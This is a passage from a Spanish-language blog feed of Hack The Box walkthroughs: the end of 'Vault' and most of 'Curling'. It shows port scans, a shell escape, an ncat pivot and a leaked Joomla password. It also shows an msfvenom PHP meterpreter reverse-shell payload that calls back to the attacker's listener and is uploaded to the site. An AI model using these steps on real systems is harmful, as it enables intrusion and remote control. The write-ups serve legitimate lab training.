&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2019.05.04&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;nuestra-tercer-maquina&#34;&gt;Nuestra tercer maquina&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Vault_diagram_8.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Anteriormente habiamos encontrado un archivo &lt;code&gt;key&lt;/code&gt; en &lt;code&gt;192.168.122.1&lt;/code&gt; con una frase, para extraer la informacion de nuestra bandera encriptada vamos trasferir el archivo a donde esta la key.&lt;/p&gt;
&lt;p&gt;Para escapar de la shell utilizamos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;find / -exec sh -i &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2019.17.47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;trensferir-roottxtgpg&#34;&gt;Trensferir root.txt.gpg&lt;/h3&gt;
&lt;p&gt;Para transferir nuestro archivo vamos a hacer algo similar a lo que hicimos para la conexion ssh a &lt;code&gt;192.168.5.2&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ncat -l &lt;span class=&#34;m&#34;&gt;5555&lt;/span&gt; --sh-exec &lt;span class=&#34;s2&#34;&gt;&amp;#34;ncat 192.168.5.2 987 --source-port=4444&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;5555&lt;/span&gt; dave@192.168.122.4:/home/dave/root.txt.gpg .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2019.31.37.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora necesitamos transferirlo a &lt;code&gt;192.168.122.1&lt;/code&gt; donde esta nuestra key, codificamos &lt;code&gt;root.txt.gpg&lt;/code&gt; en &lt;code&gt;base64&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2019.33.03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Decodificamos el archivo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2019.36.13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Desencriptamos con la frase que esta en el archivo key y obtenemos nuestra bandera root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2019.38.38.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/vault/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/vault/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Curling</title>
        <link>https://sckull.github.io/posts/curling/</link>
        <pubDate>Sat, 30 Mar 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 30 Mar 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/curling/</guid>
        <description>Curling es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Curling es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h2 id=&#34;masscan&#34;&gt;MASSCAN&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/curling# masscan -p1-65535,U:1-65535 10.10.10.150 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 80/tcp on 10.10.10.150                                    
Discovered open port 22/tcp on 10.10.10.150 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo al puerto 80 y 22&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.150
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.29s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-generator: Joomla! - Open Source Content Management
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Home
Warning: OSScan results may be unreliable because we could not find at least &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; open and &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.18 - 2.6.22
Network Distance: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; hops
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;using port 22/tcp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
HOP RTT       ADDRESS
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   707.63 ms 10.10.12.1
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   707.82 ms 10.10.10.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 26.56 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;http-80&#34;&gt;HTTP 80&lt;/h2&gt;
&lt;p&gt;Al visitar la pagina en el puerto 80 encontramos una pagina sencilla con varios post, en donde tambien vemos el nombre de &lt;code&gt;Floris&lt;/code&gt; y Super User que puede referirse a &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2018.19.34.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2018.48.10.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2018.21.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Escaneo de directorios y archivos html, php y txt.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/curling# gobuster -u http://10.10.10.150/ -w /usr/share/wordlists/dirb/common.txt -q -np -x html,php,txt -t &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;
/administrator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/bin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cache &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/components &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/configuration.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/includes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/language &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/layouts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/libraries &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/LICENSE.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/media &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/modules &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/plugins &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/README.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/secret.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/templates &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/tmp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/web.config.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro de los directorios y archivos encontrados vemos uno no muy comun &lt;code&gt;/secret.txt&lt;/code&gt; al visitar la direccion nos encontramos con una cadena en base64.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2018.31.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al decodificar dicha cadena nos devuelve Curling2018! posiblemente una contraseña para uno de los dos usuarios administrator y floris. Al intentar con el usuario floris y la &lt;code&gt;contraseña&lt;/code&gt; en &lt;code&gt;/secret.txt&lt;/code&gt; nos logramos logear al panel de administracion de joomla.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Username: floris
Password: Curling2018!
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2018.53.00.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;shell&#34;&gt;SHELL&lt;/h2&gt;
&lt;p&gt;Ahora que tenemos acceso al panel de administracion podemos intentar obtener una shell mediante una extension &lt;code&gt;mod_simplefileupload&lt;/code&gt;. Primero debemos de generar nuestro payload con msfvenom y poner a la escucha nuestra maquina con multi/handler.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=fh7ifo-Wldo&#34;&gt;https://www.youtube.com/watch?v=fh7ifo-Wldo&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;metasploit&#34;&gt;Metasploit&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/curling# msfvenom -p php/meterpreter/reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10.10.12.11 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;7878&lt;/span&gt; -o batman.php
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::Module::Platform::PHP from the payload
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: &lt;span class=&#34;m&#34;&gt;1112&lt;/span&gt; bytes
Saved as: batman.php
root@sckull:~/htb/curling# msfconsole -q
msf5 &amp;gt; use exploit/multi/handler 
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload php/meterpreter/reverse_tcp
&lt;span class=&#34;nv&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; php/meterpreter/reverse_tcp
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LHOST 10.10.12.11
&lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 10.10.12.11
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LPORT &lt;span class=&#34;m&#34;&gt;7878&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;m&#34;&gt;7878&lt;/span&gt;
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; exploit 

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.12.11:7878
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2019.02.44.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para subir nuestra extension nos dirigmos a &lt;code&gt;Extentions &amp;gt; Manage &amp;gt; Install &amp;gt; Upload Package File&lt;/code&gt;, elegimos nuestro paquete.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2019.05.53.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Luego nos dirigimos a http://10.10.10.150/modules/mod_simplefileuploadv1.3/elements/udd.php, procedemos a subir nuestro payload y visitar la pagina donde se encuentra nuestro payload.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2019.07.35.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2019.08.26.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Y obtenemos nuestra sesion meterpreter.&lt;/p&gt;
